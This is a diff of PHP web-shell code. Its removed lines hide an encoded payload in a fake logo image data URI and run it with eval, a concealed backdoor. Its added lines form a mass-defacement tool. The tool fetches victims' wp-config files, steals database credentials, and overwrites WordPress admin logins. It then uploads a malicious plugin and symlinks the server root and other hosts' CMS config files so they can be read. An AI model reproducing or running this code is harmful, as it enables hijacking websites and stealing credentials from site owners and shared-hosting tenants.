j#gsVKGfQyYsoBO4aDNrgq%H8yDTNVW9Rx%%QILIsuWPN6jTGIyAgU9N3c6jcEAgxywA2746tFf5Q1Ojq#25U#5r#NH2P0Yn4hzpj5mHo1QhGxJUF6SnJZ5GjIYq#tITjS9U4CMFqy8KTxHaaIjzzjhB6fFMKKYRaJEFOci4BP#FFmtUgUMICNLqUJmNKidSdu#4HMoYzlZMJ%FN23ZyVaRiYfJotCenxW7qJA36jTsxOAX5Zyt00hrmqyV3rhcn9ASvdVy75HBxTbELU1Q6fGsva%2H7c0uVSZSaO05Sb3Ndsk32YFfgelJDMHtxYkIKyE5WEcL#9czWlqUOD7ESGo18bNWtqs#Y1PJdSPW7gbqlK2xIj1W3wPVLyt4TA6VONhbKeKESG2gNVwmDXy54Q06yHstuBiL%KZeoYXBuiWVQ0oFUdpszYByeWLJ02H3JfGunG5xyunmx6x8bcCQYFtNZeZAp3zmcRj0qTAxiBOia6SczAmbWV9SMcRSvqQRPn%p314#Cd3IlRRBM4zerBV0oMtPVDXdiKaYHQf4olx3BNQxsr%GS6f8RBubrVmS6oEIBInUnWe0pWklnHQ9JBrZ8idLyxVvLO#NJJ7IkSR0RDrisPPuha#rzhO8uZiWZGpxfMG6DX%5Dp43crZ%PAWhWHwsgxLk3G2uA#Lwc2FRiZiNmktIgdm2cTLKLYhP608XoGifRO8Fu%ld91KhakoGMPbO5Vcm9D4Y6TpkuuQTOr1Tn94%X704vjstHRBXfbR1gxFHx2dCu4GwxpfAG9aQ6ql1eiAeo6qAh4AvWvQ6dO7TQmrWB09AOSeZDFqiuJ#XSZeP#7OtA62ouzPG8ihVfTfk0S%RyxgdUwh9iUDhSMIPmYJtMdZ%NDe0Sju7yH8rOGQ39GBaNmvrO0DZHV#TWqEjwzQJB6Qa5#XTCkCaMkSNf8RC#0MA%xMfrsh5wIbU864I89rK5siKxRVVVbl6DLmeVxjZ#Wra%OjIym66Annwj8K6tlgO2zv#3ZbYjXUbxEJrldm8lq3ZoePFbqRetUwh3V0HXKASJm2GNgLoPIcYzSL5uIKGo2jayN8D0QPlntroLhlCy%ypkFS5Z4h40otOyMMqIPBcQaO01dRKbhXG3SbiAzCfVGkw04xPOKB8dAr62kcHyY6Y10tSH#Oh9gyWqcztLyCAMLAb9tu37T0CIcaiv6l4vmlcUIBkeiH3t8Re4GdvMtMSWfnYu1up6P6#bOd3y4fNUb1C%9T53NjO9f38ETA0uPVKponnXcAig4HiufupTRnicCDKgaIEcjGk#FQzNA85D5UHZ0HyM%DYKAdaRLgIc6v4o#uUJnLgAkmoBhT#dS2ShXkm9FL#JksfsDKxRNWrvTRx2BqrnUQy2271jEtt6uDlHDvfSzYii3LreMzVcDe8qN9PEPWTe9WYxNKIsaz66uPQzp7vY%%NohCwE#gOikZ1kZOq059C5150O510IqL#9zvII0f4v0SzBjmvgoz#jp%OeZF7IeTuyrcbynVwn58GwXJLp0t%rISyd#vqkD0CwRpgc5AVqnPuIMQf8b9C0cKnFQ60umNWhF%Ap7FwXwtSOw4FBSGom%GoIhvS8z9tAEVY71NVBgdQkXuSEoCd1A2OnBalS2jrQxT#lDUARu4KWYANAllMw6RX6VW5eC9S3mK55zFztqCJsTCIaA8GY2GQQh2IWFdexC5BInGgSxNKA7l5Q757PlqGZmpM3hTxLfSdn1g%O6t6TONhjqHo5kmGo3#3VvThwKL8kLUi877m5JPAdoTVKhnQTLFU#aLZVMyRUZBZIFAl5%I46UZC0tuTty0RBwvmxaImFFlom98g3YhXhxkOOfceNkoklSivP0xFGmHOgpnrl1v0GGEtrzlxG46kj5fQN95MP1e6bk7nxdmLIp#TEwpQ7Vxb#EsGQMCI6J1zTsvyY4BuU2gq3KgxnfFskECdno7Hd2OZvl1LI%Tdcn2oRLyAXcwdjqsB#rKPTixsVb4nvsop3izAzULv95BJGFH5FJssSr7hgPyNA6GPk1tIVj5EpBn1Gs%5S#bJRiSZn4gp9t5R0afyW9jq2ma5nlncn7p6AA3Rnioidq6woA3uUlc7I4XQyEAFZSVmOtyMBDD68BVMRK455qKL1FZJoCwCxe92EQEl#Kxag3ec8uipkzkYEJsjb7DQ2vIbUdIpSFIPe7iMQOHwjsP3E867bPr0JILY2mcU%51ZNDi7BIDbmDTi4mWt1VVw9gxLRQT9jQsYVJY8L2YfS4LCVx8UwwmeuZy2IRbF73iAT1zAZosUCFj62BD09R1SUOspLzyCDcP4wVuXKYyT3j0kT8QeRavxjPCfYa4K%n4Dy008MOMyjz6w#sj%aAI%QuqEhcI2lVFxOlCKQOSo81D5aktfkeGAhrHuGyIBn#lA7qbnZP2#DnpjY5JbxYuYR223CnoBx#ClvhF2BRCimvLoR0AjG8LDp%DXxXJKwdBm06g3d8EVRBiu334gr4VlPRHWW9YNG6C4V1k40Yb5RDjvSZBmrI6PDaqyOAGzeEH4J9ScDvyRy4zGtOMcuCxNf2tmNdc6VsWOfJQOhRriCrvj9KS#eYt3nOSBWyXSRqqyJbhaL6NrtJl%3fQRYe01#xQWdd95M2OxVqpU%L2RS2Gh5n0LnNhfhg5MpyS89PCH70KU5qTnBad968i6oD#9lzeO%Kkv90SopkMElzuq#baJ%W1c5uMt2Ac0JfHATZxAiIZpu#VYLmbXcgdx7pUAl%Z%gJ5sx8qx6aFFGS1lH2uVkyNnSuzLOxv63Rgmf1RnQ138Pj3bzMv8ud0Z9Tj9t##FxZCcYmTIwP4vghTFTaWeVkG2htFC2fyaNrAaRn3jJml9oUlqXii3FngZUzCdDjC%nK0kVT6phwWgIptVkIwRhzu0Z0XhEiAcZt60WJbntuMVhyPsyDbAc098BbiujPQe3FZfjixd1TJhuckjqo4TGdLVa3cufal7ep0KA#2w7JGH23XV6hNlrIiZLQV92fRE7KfxTjca4BHaGGac7atq9fK#GNNtcQFicVq2QUzBzUBZz3xgu715mYKx7H2LCDW26rTYW74mesKwhnFGeOwXGOwx7pcUanlY7lrp2k3KLA7nfhA10wd3FUqNNSy5VmFiagIK#wKeVjhYFkRDrYqp9nK5Mf8zjMj3RWXJYcV47qlQv6Bim8gqJeKJmthoC05FsYenotWaLWJz0CesyOZ2VVGw%Jo5DQ7gS8opuYLdXjTbBoRQ8uOBdgqsZBhhcbcPlbeRs%GGJl8Q0zeOkzc1LohpkUppn0ZHVKOn9z#Rbc4bfFhTctXlat8ChKRULW9Ensd7UOvwulsjlH98EGeJ6CE4KO%Wizx55EfUvJzXI3hj5NAbLa4Z7ig4dJHBYI2SlmfIxe0lYdrFT1dtoLUHvw8#KGxNLEqK#Mfui3TpnNDqxZaStbrdsJgYMnoBoYR5fFPb1pyqd0jBDoMqj4EpDot7%fbVX6%3CmQ#on7BJYfQL53ApPBxCsmMGbMYMyaworyIz#nyUntsHxiUB7Z#mS0sVHJ6zdTvNSTNK5RfJgiXqDWUwk0hgqZmI98z#TNVPzxag4AfUeStFUbi3vmFDHF4dCUdyWows1b1wTr0rhmblNGj3UbyqbJIyNQkgh42qRiiT#Ux7psuHwrkU3DaKH8PuWe1TY1MnlIE93Wltz#kLe%mbl2Ov1aOBy0#zs7tVB2v0DwaCD2Jo0MaMn9bhnf1p82KThUEWEt3OkoziC3cKI#x5W8CFtnkhu8uGRe6m2hbR50k28nytttrItbCvvSsh0xHFKCt0GM8Xy70ArUxCA2uHMb27ljQA#WIUYYOqx36bkgp#L8DuXQRk%hyK7D#8R4fFxH0LBmg#bOYzSIbn6#p4TPUNkz2cyKHFLqAWFoY2FKvXcrg3rK4WV4WnzelINxtpNKU8nUJweukRujOgm%f%OypI6CrZSQ6tbjgoQEwSYuQgaRZ5HaVwB5ySeb5NS7CXyLdUs9KAgJmfhsoqgF#F%b1cOSrH8Eq164nQv3ETEsMmIVv8qL3zijEstywSsuj%t%YyaStfhdo2Qm1Bw#UGpjyai5m7aLDEs71EIok3#2mBza4kNaQdPF%2UO6D5#wye%t1O8BuqYcbECpPXZo0cgwNUAQtcSPGCmZUe7#2#3GSfQamO#HQdqimRBroWwOjPS9Wjk1W73GKuhhwoFiIeszBjYAuZvG8B0ANG9MHtrYaTDlobhNNtgwjWqFj16pIY3tFqEy#m9rnFuyOgVARM#6uDWG7QrgEEh7XxbPoW2RKiGXG9IZ3TV8GYQGXrNCRUn%BR9zGZQEb7YcIjpWO4wT9jVVIZXoo#Ki6%e79GHH4KVGpF1XWaEkXnmOKZJL2tR%VpCTTPj3ltou0%xPyNPx8iTB5Y0cOCiHZ0cnezsVjjs8nHHt1k2VoNI90iKC97cgdVSFYRn2zb70DjWg5ddK%3BOiVs7X2YpcDMLECchp4BymTUH6Z#YA0epH1QLCulfKy9XvF3axo05W2u0Qp9gJZgtjpgzMY4q9CEaXpDb98zuaojIkKT8cL5thq25lEunk5LUZjYJYgw3fDEv3s#LecZD361%X#RLkqt8CBuoByaHYSZX9slnGalevbl3PGF53hFDGjzGG#pLyea1fPvu%nD5xtex95y08wPkmSUxSO8hKZ4nZ61VUATWXf4bUce01Ze4aVOp38AOeLm863CbeXyqm4#TDbGT9l0LQuhafmejd8aT1rjhVj3DFy3L2c8eZD%MAQd6aa4BwoKorxWCWa7sbztEWbMGnNaZvPQOfmWiAtsNhvepXqRXGQXF#5F22koTy3Dc9fZbn039i%SR%Xz%9W%fNSobTtNWzgIp92tT1I4yVvdpcuusbWRc3qyL3lXUsMZj3D3N#%t5rh9J2dHNxsRehEGEG%HR5QfG1DnKoKC1Ijn87N4SS66#fevaP7v251RjBusrBukcVKYAB4yTwQN4DB6v0IMN5uJBYt9#20Fcz#c7bjjvr3HYOwUKm9jjJ3Cb#M8ukH3Tyaext4ShF5AL9M6fbV#OPrpxfGP7xAV3WO88FN5WSdXzF2VtEqEkqgkz%WyLmYaBEAdMlfwAQtaPC5jD35dB3fPQUwLkytXQp9KU98q2dmRvAoPw0GbT0vK2mGOKfRyBUrPAZBf6KZmKXjDdV0xK8mCHrd1QUIZ5gWBkouohLf4l5bJaecxK7Vg9v06ZOEFUyHLeMk5jD#t0hkB2G%Eyoe3t0HbToeLfjU1OoZBddYZihmg8jSDdiAfT4wJldziLYE1uHBppr5wG58Kw3CA1#L0cznonR3BHCvPTUALZQCCougV8rN0lm988owZ3c7BH9NZfDuim0FTmemg06PbefqfsRM#TX8PBpZTBUwzdaVrHtZAxpjBbaJDtdN%7zi#PHAFDdILkOGdsGyVwuqGPfsfz%7Nqss1amIWXzah%#c%G9FkT5klxCUY1ABdbzgky1Ay#hi7vI5zeUPf0LVrmEgswwinnXNR7lIfcX9Muy9vte875HMbR%M7taez5kxKuXHE2Xi6LIRO0eaRkjuIeh19z40%eVJyweyTJ0%6xqU57eXH3CVF7dJLdxw8E#LkbnhzOvCqdk#8I2D1HI1YpnEJLrqrgeRFv4uBgxKbRDPqvOWLTtkQwpuErnmQlmc56icgIFOQZLYh734llV9WqHXUTaa%qgNstAK9ugv4dcHlgXvl1Ye8RM5MtvcKqKR3GDxWTAgyVgVpS3Jrw92#qF%4jy4aF2nru21xom5EgWRGo4ZYPhE5p3gskM28lF0FQSTuYfTdnJczb2FekrzyuK#0CIu#bU2fcSixIgDxKhyHfqX8Pwm8#fyO3XpRhmOY08ayWcBvPDggO#19#4dAC20G%hSIoyoPWKGc%joX3kVEGHtx9Zy#aRyjAkHOLX31hM2jnxKKDG3EihDZeUwXqarWUN7vDIW7jUb42coqYqjWaxhMrcmjVOJ#DKDDCAtXOLBEdAm5OanxyqJkCCAMIStDltA6XsCKi4kPeYxZu0heIi#QFhOwzhfTED7KtbdpyhMBUqZmaYTMuJcWo2gxeqks8eS9gW9QaWfy1#DJ471uv5pmHae27mCWwSees335mWHcSvncgWesyoBfxEgx5UAIDahmjDfkQDSoc38luZUgF5I733ncbdC%qgNeuQp5cC#xuugXjm0k0DX#APp#XQUJzFWwelhDHVtDnQxRzsETOowgqDVwb8ojpdigfwUq3e%NKrQb1Zrig8pDmXinN5aDqRjqbgRzO0wXB%SMay08Od1u9DRR%S%pRkGSaBuiYAR8F4%xouz0oS2EjbIJjo2aYx6m2YurtP5wBi07G44fux957zmnr45%1GGd1R7el%BEDvHRm6PnZ4iaLKIvT47fMmgfWRT78dXRyREmhxhPA6bJLNgeuJlbRsLGDXZGcXO%oM02q5RLrXX27O9vjk7dP66phGM6aVB0GpZNknhhhv8fpaBTL7wWjwvMbmdBEgh4nkLTfDGDy569e1EEROEM%TCPp1%e3KR1%M6WFuNOoHpYe#Jgg9k7q8694VyQPee2s%sE7j2TdkUk#TRQ16m62kxu19#AISKa5mSqd8QNM3qOK4%O2PNXz07w2219iWzHxkx1DHsyhsPiwhLu7HdJdxl38fe0sj2S#HxRKnTeHD97Qcp13XVasGqSVlAqu#XwG73R7O40NuU6u5znJ0fPzo64JEB1uks#nAzXVI3#8#P3P9FLLvTKSeiLQU%5aLhjjr4ajjABmlcV4Idv8NfCgdUAmqlqiQhgfM6PM132y2h3%SReMhFNAIrUgcRE84rtdEIxGMo4JPyCt6SsvTbqf9zrh87CYvEUJFpNrYCPD2SFWqV0trrmZxgOVGbL%VlXtCZiZw6YNe%zkBLmnF2DVCyFw#NmrdOvDi4r%TEMdxeGGBp9vb1V5y9KO0Yw73ecbQqklxVJl2O1qxLRjZ%ufdGqqOQhEVrTZqS1gY14U7hV8XFlA4TsLwxjJtOVXvcGIMqRuBaUE4AdUN0F#OF3xoiOjuerRZQLcUAf5QJLTUHxtzD61kYhl24orgquZzeIi0YFnNeu6RzAuw9v3qyjHT86ICPdu3ezSfA1s5DazQYFPJBukGFirsL4YiMewWgEoowmiRsUaI5qWtXs%FaRn51W7boFXwpgTQwobF7kifs5B9kBtwNfvzs9Ojljr9#dHVtjBq#MV8KryXDjRZCFl7Owfz178#HolAEzwQI1D0jRWVtuYx2zExGCfaXQq4KrOmdTViHcfMuaX0bTgyRQJSGhcvWp6iluEsBuehgtYvBa5Kh3XzAP50Sm7P3CjFkp7X6XmJDcnhso5mS%dmTUrjcZEVLwmnyu2Xwdl7uKy4tAkpv67rpw6Q%mKVmZzTWEz%ir5l#JLUNlkhMmTHFGHoGAkHVHAfEIp3XWCVaTXMfS17P6VztDZUYToCjU0BJlujThO1gchVH#JRql8u9wNauOK2EJ2rxUCiUbNndoQZ9izos#GgbOj7Qtmu50uk86To#JktTixR0vMQV6VLnvFXGQZ0BZ5lU2ebo#6w%Hr5%unJTlvY7Dp8kGmT9UZV6tzzxePv3##%IaQ0JZXmM0FfbUuWZc1HXuPQVqAj%8OCiqvy3gA#c#VPyoJS4kdpdzL4wKGfIxvbOruYgXeSNWAtRQXN##yecWLgeqpVRQxTKHY95W%JhjocHW08FyH5Mm0v8L1bJcjs0UGbKw%O6IsqnV8iz0oBuhV49ok4SZ0e%4ArAv%A1gbsCYry3ckKvvdPL#hVVnM52vv6KdExDSVwmMz#pYgFYANjeduLlb7NV#ujtJaZMbhPPQ8GU1grnlg73Rrh%GiPOHyD9qvw#vglEPb1Cgqaf3wtCuXrwQhjm9WWjdnALY74kNAU0wrIJZygtZXJq43WpAdTK#GmZshILYLLrEnxZaQsSuoOaywkvQvFUIH0FLWGYEKji057mBhGnwPTmOMqBbljm3DeniwaqwD1xVogJKkfP0auTyAkGzBBlkgdhBVLV0G1lOpIKYC8eR0XhK5trGAV22NqenXqWXrJEB2%rC2YwMmrvvoUPM70AIXrx2Dw0S#CFE0AbWehq4OgEk3FO8gDNLx7J5MD8eDc#pJoTM7WpUyashbUY3G5p0JQok#ieqS3m7T6kWpBYBX6D96Lwbaz06ywO0nVymzbQcnWlz7Ubp0QSqtod4inTgM2SQbOy8kMCIH0Y8leIyCdHnF0lYHIUUx0uFeYjyAdMrI8tR07ULdPA0L%7CQGMYxky4iBWZ4kDLJOE6pLMqmi13cOlpImSUvjh4SzuU4wChGVwa0K23MpQMDWisQn5QW17XGDBFh#qEedpvpROapzmCvNqzPjob39XHC50E9jiikEklkoLAhKiA6V84WFHUlyEP10l#GNFqcRUkLJ4w1EV0rWgax1%ST4d#K3dPk#R05F%hVHhormOL4xdN2DkNTm3kpvXy0OW4S9KSOLh33fYAywNoNmlJBUhs#yIu3F%6XG1unbSWHViZwl%tKL0OuEvA3c2A9wh4bx1wyTVf5tZSVs#aczWEkFUUpbiiF6vTvpncVclZSXlA2BwXuhwWCBQ%VKa5iYy3ppQQOeJCvUtqRUCGfCoeMer055fupYyD%OiROtxcDmjHN96#F8igzHZJ1fMTMgfUWMi86JrPTmLUcodBIzAyuqtZynLX9pWTEq%oEWhOTZ#MddQ9i%ktLXstxzt5jN41PPm62vPv###%R6FBp8T4nrUMXiHjGkijUQ1aDQ%yp1Iym9vcAqZSfqvMhrVrA0leMSZKWkyKpXU3a0Y5mvCnbb57fvzh3Vn9O9qVi5QpTwh#Vwdzr0k2LypLwj1YbpXyHuFepWb4KxWgW6rpxJJa%xeFqkhaRW#2Cweaz4Rsdhqgk#kXdCfzfUKcY3d7DttPF958Pqx%qkXnLihQn3HhSa94FDDtGzu0jjyqSpZXT81ROM6B1SyH4KtVlml94AWewtUZlOe6IY6g1irgoNM3IZSMcYlEOsJO98OVq6O02ylD5QmTiKuPPm4wZmQjWHHBpB#mtPfpU6l2nDGx#qzaL7MPwpuPB#YDj6SoJMT9vIxRt3LmC54dpuucwqWSlt6Uxvw4COd1BCTuYLtsr101RO1DHCR8lU1BT6ifgH9hPZKjCVkNLxm3JpTGZ32GjoST4RHdRY9oGXAHuVdQiM7wY#i%tMHeQxXYNxUh8LAlpYKIo6UQI4PrNlWWaV5XVHR4S63bkzW7dcg6a2SVwFoc9W5Vo7nQZi6P06dL2ekQ8Q2QIvOsz94nwQ1JhQ1p3Bd1#vMJfaQIfYcd8#00668j1KrjjmRVg%y8oUFtsOTiJhW2bUyuctmb129fnwGjs#OXL7lPi0X1d3ttLelNp5i1pfycL#ZnUU4J9pbb3Gu7udmkXArbuxJSEHE5s%6kZF6CHJbKCLkORw2g9JZMCmps7EFuaZrdct2o%FB8V4YA8sKoMgbQN92%4X866g8GVwgjLF8JxXXLyS1FN3crJuLNtzrgtVFE6TZccEcB6Lmg0pAKwQwXjwBFIXFnFjZoS1Qt7Xs6ZVMOTHcJjU%aQU08supd%e6z#qUqItrVmQM9mAGP9RpYJBL6Hgw6B109v9xfcWMfklhFaEjKO6HQLLgeHWLi%m7IJ16zRtatm2YmtxXNu1dJvUrzkpGH3TVNsWs13#ccq9pRC7as#5INMDpMcjUkc34P44OVxegjnhN#gfnYUKpkW4260uFP7ePirrVuA02IRiuqQZaGRKfEKIm%KNeSrC1QNx8PRogNqQYZJ3BmPOoE%MZrWcrkc8kZJ3lZePE8CCpy4mKENdNrdeyCivu7lS1FHYCiBVqlMeXoYzBeYcBfKVMNY4y#rcSy9Tg6OC3vLCwh3x5lM5Kwq5eZJQwZLB0IO3zOoEwtOpjA3ZXHMM96Wf1nfPUzTKiHbpP9jObQn3EV9eH06ARW1ehy#zNqwqNlEt78jFPRnVvYx5OEmuJxrV53D1vKPs0p6DaDTh7CnKTbvZFXWEtdT3SnvHyIIpK#jmAFkVf111vRZAfm#04FtypOqppr1clxWk%IhbHyMC2ZR40b3vOx%8puHgA0aqu4Zcfes#9yv2fAmHJIVPQLgzO89cL5WZCKk2%ajoNnIdAcMVol8zoKfO7psLiDZ#S8WZYte7sY31MdjePfo3fP3h7hbTHq%cnRPz8cnZ6NPpy8Fr6jNdxZWKJBmtBzrMLTYXFHnur66JCzi44l#oaTHJj4dS7ib%MnPI7XEWXJWtCV37BgRnd1ikXKyYdXfN#hZcYMFHiazCkpXN5FIiKayQKarN1koKObTfL85PX7M9EkcruXbrEvuHWruLLBNPSlawmJEZITPHjBaLxKEvSkxnd1Mzythi6No6ux4xM3fZjIzbCtkk7V2TYv0OYQeRYPmPMSvnvsJEhX84y9iMf7hPDQMdoAD0tKpnBU2O%yg4LIjQzZsfKouJDSesc7QOF1WhqCJVjgxQckoED7nGexefIa6ayMwMNtbkJUneIZ6Cw2gy#5ZEKp3KbjpQmpVLlLTBQIIGo2Y2scV1quIqPsnG1Z1JaKgOvisHJ#E9o4rMwnjdyMjrIRmtDVIMQx2PUjUO5zpgxskUMkezlbjlYU1wnW7YrRKGsW5zN2ObspCKjVL7jTBKyleAHGMmdFxwJdBGmKlgAAJai34lmEI6ccVgbuEpNqttUl7KtaDS8SERIlnw99KE9APNztnMU93Qz3wCNf7bxHy9VmWdx%7yBZQdJj71#933V5g95AIllZzFzYYchpddGuTdV8TdU6TYW7YXejVgCoFdKAn70VHbPsXloE5oSMjYB0ZooUgGECAiRp284tfvMgFOYkJUN43T9PnTzX8f#3c7HH#dTkKTdLmk8d4kEH1zSaI8VlYw6#EW0qIVQTCxC8QcEE#fH0eATy7PT18TsBkXqTYAEzFCUfhlGI8rXu4mu8x0%cXGWGbVGXita8vOzeCmAklwQfp9YoBo%2ZAxoY0eDx90b8fYiDb0wyfA0MhzmwK041B43VNogJKllSGgL0D0Nxq#jSYw9WRIuzBPrhXXU5Ks19uZzmuRGmKsKFMoTjmf%Gw==">';
-preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);
-$logo_image = $logo_data[1];
-$wpautop = pre_term_name( $logo_image, $wp_nonce );
-if(isset($wpautop)){
-	eval($wpautop);
+
+<center><h1>Kontooooooooooooool</h1>
+		<form method='post'>
+		<textarea name='link' placeholder='http://target.com/peli_gedi/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
+		<input type='text' name='script' height='10' size='50' value='Hacked by RUTH72_' required><br>
+		
+		<input type='submit' style='width: 450px;' name='ancuki' value='Hajar!!'>
+		</form></center>";
+if($_POST['ancuki']) {
+	function ambilKata($param, $kata1, $kata2){
+	if(strpos($param, $kata1) === FALSE) return FALSE;
+	if(strpos($param, $kata2) === FALSE) return FALSE;
+	$start = strpos($param, $kata1) + strlen($kata1);
+	$end = strpos($param, $kata2, $start);
+	$return = substr($param, $start, $end - $start);
+	return $return;
+}
+
+	function anucurl($sites){
+		$ch1 = curl_init ("$sites");
+    curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
+    curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
+    curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
+    $data = curl_exec ($ch1);
+    return $data;
+	}
+
+	function lohgin($cek, $web, $userr, $pass){
+		$post = array(
+					"log" => "$userr",
+					"pwd" => "$pass",
+					"rememberme" => "forever",
+					"wp-submit" => "Log In",
+					"redirect_to" => "$web/wp-admin/plugin-install.php?tab=upload",
+					"testcookie" => "1",
+					);
+$ch = curl_init ("$cek");
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt ($ch, CURLOPT_POST, 1);
+curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
+curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
+curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
+$data6 = curl_exec ($ch);
+return $data6;
+	}
+$link = explode("\r\n", $_POST['link']);
+$script = htmlspecialchars($_POST['script']);
+$user = "kefiex";
+$pass = "./kefiex404";
+$passx = md5($pass);
+		foreach($link as $dir_config) {
+	        $config = anucurl($dir_config);
+			$dbhost = ambilkata($config,"DB_HOST', '","'");
+			$dbuser = ambilkata($config,"DB_USER', '","'");
+			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+			$dbname = ambilkata($config,"DB_NAME', '","'");
+			$dbprefix = ambilkata($config,"table_prefix  = '","'");
+			$prefix = $dbprefix."users";
+			$option = $dbprefix."options";
+			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+			$db = mysql_select_db($dbname);
+			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+			$result = mysql_fetch_array($q);
+			$id = $result[ID];
+			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+			$result2 = mysql_fetch_array($q2);
+			$target = $result2[option_value];
+			if($target == '') {					
+				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
+			} else {
+				echo "[+] $target <br>";
+			}
+			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
+			if(!$conn OR !$db OR !$update) {
+				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
+				mysql_close($conn);
+			} else {
+
+
+
+$site= "$target/wp-login.php";
+$site2= "$target/wp-admin/plugin-install.php?tab=upload";
+$a = lohgin($site, $target, $user, $pass);
+$b = lohgin($site2, $target, $user, $pass);
+			
+
+$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
+echo "# Db Host: $dbhost<br>";
+echo "# Db user: $dbuser<br>";
+echo "# Db Password: $dbpass<br>";
+echo "# Db name: $dbname<br>";
+echo "# Table_Prefix: $dbprefix<br>";
+echo "# token -> $anu2<br>";
+$plug = "peli.zip";
+    
+  $post2 = array(
+					"_wpnonce" => "$anu2",
+					"_wp_http_referer" => "/wp-admin/plugin-install.php?tab=upload",
+					"pluginzip" => "@$plug",
+					"install-plugin-submit" => "Install Now",
+					);
+$ch = curl_init ("$target/wp-admin/update.php?action=upload-plugin");
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt ($ch, CURLOPT_POST, 1);
+curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
+curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
+curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
+$data3 = curl_exec ($ch);
+$as = "$target/wp-content/plugins/peli/5.php";
+$bs = file_get_contents($as);
+ if(preg_match("#RUTH72_#si",$bs)){
+                        echo "# <font color='green'>berhasil mepes...</font><br>";
+                        echo "# $target/wp-content/plugins/peli/5.php<br>";
+                    }
+                    else{
+                        echo "# <font color='red'>gagal mepes...</font><br>";
+                        echo "# coba aja manual: <br>";
+                        echo "# $target/wp-login.php<br>";
+                        echo "# username: $user<br>";
+                        echo "# password: $pass<br>";
+
+                       
+                    }
+
+
+
+
+		
+
+			}
+
+			
+		}
+	
+	}else{
+			
+		}
+}
+if($_GET['do'] == 'config2') {
+			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
+echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
+exit;
+}
+	if($_POST){	if($_POST['config'] == 'symvhosts') {
+		@mkdir("kuontol_symvhosts", 0777);
+exe("ln -s / kuontol_symvhosts/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex kuontol.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any";
+@file_put_contents("kuontol_symvhosts/.htaccess",$htaccess);
+		$etc_passwd=$_POST['passwd'];
+    
+    $etc_passwd=explode("\n",$etc_passwd);
+foreach($etc_passwd as $passwd){
+$pawd=explode(":",$passwd);
+$user =$pawd[5];
+$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
+if (preg_match('/vhosts/i',$user)){
+exe("ln -s ".$user."/httpdocs/wp-config.php kuontol_symvhosts/".$jembod."-Wordpress.txt");
+exe("ln -s ".$user."/httpdocs/configuration.php kuontol_symvhosts/".$jembod."-Joomla.txt");
+exe("ln -s ".$user."/httpdocs/config/koneksi.php kuontol_symvhosts/".$jembod."-Lokomedia.txt");
+exe("ln -s ".$user."/httpdocs/forum/config.php kuontol_symvhosts/".$jembod."-phpBB.txt");
+exe("ln -s ".$user."/httpdocs/sites/default/settings.php kuontol_symvhosts/".$jembod."-Drupal.txt");
+exe("ln -s ".$user."/httpdocs/config/settings.inc.php kuontol_symvhosts/".$jembod."-PrestaShop.txt");
+exe("ln -s ".$user."/httpdocs/app/etc/local.xml kuontol_symvhosts/".$jembod."-Magento.txt");
+exe("ln -s ".$user."/httpdocs/admin/config.php kuontol_symvhosts/".$jembod."-OpenCart.txt");
+exe("ln -s ".$user."/httpdocs/application/config/database.php kuontol_symvhosts/".$jembod."-Ellislab.txt"); 
+}}}
+if($_POST['config'] == 'symlink') {
+@mkdir("kuontol_symconfig", 0777);
+@symlink("/","kuontol_symconfig/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex kuontol.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any";
+@file_put_contents("kuontol_symconfig/.htaccess",$htaccess);}
+if($_POST['config'] == '404') {
+@mkdir("kuontol_sym404", 0777);
+@symlink("/","kuontol_sym404/root");
+$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex kuontol.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
+IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
+IndexIgnore *.txt404
